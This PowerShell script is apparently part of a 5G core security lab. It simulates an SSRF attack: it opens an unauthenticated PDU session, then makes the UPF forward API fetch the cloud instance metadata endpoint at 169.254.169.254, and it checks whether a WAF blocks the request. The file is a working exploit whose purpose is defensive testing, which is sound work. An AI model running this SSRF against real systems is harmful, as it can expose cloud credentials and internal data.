# 02-upf-ssrf.ps1
# Simulation: UPF SSRF / exfiltration via the exposed forward API.
#
# Flow (two steps when -SessionId is omitted):
#   1) POST /namf-comm/.../pdu-sessions — get a sessionId (same weakness as attack 01 if WAF off).
#   2) POST /nupf-dp/v1/forward — ask UPF to HTTP-fetch a URL you supply (N6 from UPF's view).
# Default URL points at instance metadata (169.254.169.254); optional WAF blocks that in the body.
#
# With WAF enabled (optional), the forward request is expected to be blocked (403) by the edge policy.
# With WAF disabled, the request is expected to succeed (UPF fetches the external URL).
#
# Usage: .\02-upf-ssrf.ps1
#   Optional: -SessionId "uuid" (else creates one via AMF)
#   Optional: -ExternalUrl "http://169.254.169.254/latest/meta-data/"
param(
    [Parameter(Mandatory=$false)]
    # ALB DNS hostname; traffic goes ALB -> UPF listener rule for /nupf-dp/*
    [string]$BaseUrl = $env:ALB_DNS,
    # Skip step 1 if you already have a session id (e.g. from a prior run or verification test).
    [string]$SessionId = $null,
    # Default to a sensitive link-local metadata target (should be blocked by WAF policy).
    # IMDS is typically at 169.254.169.254 and should never be reachable via untrusted app-layer forwarding.
    [string]$ExternalUrl = "http://169.254.169.254/latest/meta-data/"
)

if (-not $BaseUrl) { Write-Error "Set `$ALB_DNS or pass -BaseUrl"; exit 1 }
$base = "http://$BaseUrl"

Write-Host "=== Attack 02: UPF SSRF (metadata endpoint via forward) ===" -ForegroundColor Yellow

if (-not $SessionId) {
    # Step 1: obtain sessionId — may fail or be blocked if WAF requires 5gc-auth cookie on PDU POST.
    Write-Host "Creating a PDU session (this should be blocked if WAF is enabled)..."
    $create = Invoke-WebRequest -UseBasicParsing -Method POST `
        -Uri "$base/namf-comm/v1/pdu-sessions/imsi-001010000000001" `
        -Headers @{"Content-Type"="application/json"; "x-trace-id"="attack-02-ssrf-create"} `
        -Body '{}' -TimeoutSec 30
    $pduResp = $create.Content | ConvertFrom-Json
    $SessionId = if ($pduResp.session) { $pduResp.session.sessionId } else { $null }
    if (-not $SessionId) { Write-Error "PDU session creation did not return sessionId."; exit 1 }
    Write-Host "SessionId: $SessionId`n"
} else {
    Write-Host "Using provided SessionId: $SessionId`n"
}

# Step 2: UPF validates sessionId then performs outbound request to $ExternalUrl (SSRF primitive if URL is attacker-controlled).
Write-Host "Attempting forward to external HTTPS URL: $ExternalUrl" -ForegroundColor Cyan
try {
    $body = @{ sessionId = $SessionId; url = $ExternalUrl } | ConvertTo-Json
    $r = Invoke-WebRequest -UseBasicParsing -Method POST `
        -Uri "$base/nupf-dp/v1/forward" `
        -Headers @{"Content-Type"="application/json"; "x-trace-id"="attack-02-ssrf-forward"} `
        -Body $body -TimeoutSec 30
    $j = $r.Content | ConvertFrom-Json
    Write-Host "  RESULT: UPF fetched external URL. statusCode=$($j.response.statusCode), length=$($j.response.contentLength)" -ForegroundColor Red
    # Avoid dumping huge bodies in the terminal; first 200 chars only.
    $excerpt = if ($j.response.body) { $j.response.body.Substring(0, [Math]::Min(200, $j.response.body.Length)) } else { "" }
    Write-Host "  Body (excerpt): $excerpt..." -ForegroundColor Gray
    Write-Host ""
    Write-Host "Interactive verification (AWS Console): CloudWatch -> Log groups -> /5gc/upf -> search 'N6_EXTERNAL_REQUEST' or the target URL." -ForegroundColor Cyan
} catch {
    # Invoke-WebRequest throws on 4xx/5xx; extract status to distinguish WAF block from other errors.
    $code = $null
    try { $code = $_.Exception.Response.StatusCode.value__ } catch {}
    if ($code -eq 403) {
        Write-Host "  BLOCKED (403): This is expected when the optional WAF policy is enabled." -ForegroundColor Green
    } else {
        Write-Host "  Forward failed: $_" -ForegroundColor Gray
    }
}
